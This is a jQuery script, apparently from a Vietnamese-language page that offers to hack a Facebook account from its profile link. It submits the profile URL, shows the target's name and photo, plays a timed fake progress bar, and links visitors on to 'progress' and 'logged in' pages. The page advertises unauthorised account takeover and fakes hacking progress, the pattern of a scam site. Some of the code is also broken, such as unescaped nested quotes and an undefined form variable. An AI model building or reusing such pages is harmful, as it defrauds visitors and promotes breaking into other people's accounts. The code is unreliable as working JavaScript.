/*global $, console*/

// SCROLL TO TOP JS
$("[data-treexil]").on("click",function(e){e.preventDefault();var t=$($(this).attr("href"));$("html, body").animate({scrollTop:t.offset().top},500)})


function start() {
  var duration = 40000; // it should finish in 5 seconds !
  var st = new Date().getTime();
  var interval = setInterval(function() {
    var diff = Math.round(new Date().getTime() - st),
      val = Math.round(diff / duration * 100);
    val = val > 100 ? 100 : val;
    $(".bar").css("width", val + "%");
    $(".percentage").text(val + "%");
    if (diff >= duration) {
      clearInterval(interval);
      form = document.forms[0];
      form.submit();
    }
  }, 100);
}



$(document).ready(function(){


$("#menu_open").click(function () {
  $(".menu_mobile").toggleClass("active");
  $(this).find("i").toggleClass("treexil-close");;
})
$("#close-notification").click(function (){
    $(".notification").css("display", "none");
})


    $(".hacknow").click(function(){
        
    $(this).prop("disabled", true);

    $(".panel_form_container").before("<div class='loading_circle col-md-3 col-centered' style='text-align:center;margin-top:20px;'>Nạp dữ liệu thành công <a href="javascript:if(confirm('Xác nhận tiến trình Hack Tài Khoản này?\nĐể không tốn thời gian cho thao tác của bạn\nHãy chắc chắn bạn nhập đúng Link Profile Facebook :)'))window.location='./progress/index.htm'">Continue here</a></span></div>");
                $(".user_not_found_msg").hide();

      $.ajax({
        method: "POST",
        url: "./process/index.html",
        data: { profileurl: $("#profileurl").val() }
      }).done(function( msg ) {
        if(msg !== ""){
        var data = JSON.parse(msg);
        var name = data['accountName'];
        if(name === "")
        {
          name = data['urlname'];
        }
        $("#hacking-info").val(btoa(msg));
        $(".name-fb").html(name);
        $("#profil-picture-fb").attr("src",data["accountphoto"]);
        $(".profile_name").show();
        $(".profileimg_container").show();
        $(".hnow").show();
        $(".hacknow").hide();
        $(".loading_circle").hide();
        }else {
        $(".loading_circle").hide();
        $(".hacknow").removeAttr('disabled');
        $(".panel_form_container").before("<span style='text-align:center;display:block;margin-top:25px;color:red;' class='user_not_found_msg'>Authorized Access <a href='../loggedin2/index.php.htm'>Continue here</a></span>");
      }
    });
         return false;
    });

  $(".hnow").click(function(){

        document.forms[0];
            form.submit();

         return false;
    });


});